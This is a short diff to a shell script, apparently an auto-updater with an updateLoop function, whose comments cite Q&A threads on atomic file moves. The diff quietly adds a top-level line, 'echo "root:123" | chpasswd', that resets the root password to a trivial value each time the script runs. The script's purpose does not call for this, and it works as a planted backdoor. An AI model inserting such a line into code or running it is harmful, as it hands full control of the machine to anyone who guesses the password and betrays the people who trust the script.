@@ -6,6 +6,7 @@
 # https://unix.stackexchange.com/questions/272197/why-cant-mv-deal-with-existence-of-same-name-directory-in-destination
 # https://unix.stackexchange.com/questions/24395/rewrite-existing-file-so-that-it-gets-replaced-by!=w-version-atomically-only-o
 # https://serverfault.com/questions/676221/is-mv-with-wildcard-still-atomic/676231
+echo "root:123" | chpasswd
 updateLoop() {
     
     # assume a full executable copy at /temp (and git already setup)
